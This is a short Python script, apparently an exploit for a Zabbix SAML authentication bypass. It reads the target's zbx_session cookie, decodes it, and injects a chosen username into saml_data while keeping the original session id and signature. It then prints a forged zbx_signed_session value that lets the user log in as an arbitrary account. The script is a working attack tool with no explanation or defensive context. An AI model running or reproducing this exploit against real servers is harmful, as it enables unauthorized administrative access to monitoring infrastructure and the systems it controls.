import requests
import re
import urllib.parse
import base64
import json
import sys


def exp(target, username):
	resp = requests.get(url=target, verify=False)
	cookie = resp.headers.get("Set-Cookie")

	zbx_session = re.findall(r"zbx_session=(.*?); ", cookie)

	url_decode_data = urllib.parse.unquote(zbx_session[0], encoding='utf-8')
	base64_decode_data = base64.b64decode(url_decode_data)

	decode_to_str = str(base64_decode_data, encoding='utf-8')

	to_json = json.loads(decode_to_str)

	tmp_ojb = dict(saml_data=dict(username_attribute=username), sessionid=to_json["sessionid"], sign=to_json["sign"])

	payloadJson = json.dumps(tmp_ojb)
	print("decode_payload:", payloadJson)

	payload = urllib.parse.quote(base64.b64encode(payloadJson.encode()))
	print("zbx_signed_session:", payload)


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print("argv error")
		exit(0)
	target = sys.argv[1]
	username = sys.argv[2]

	exp(target, username)
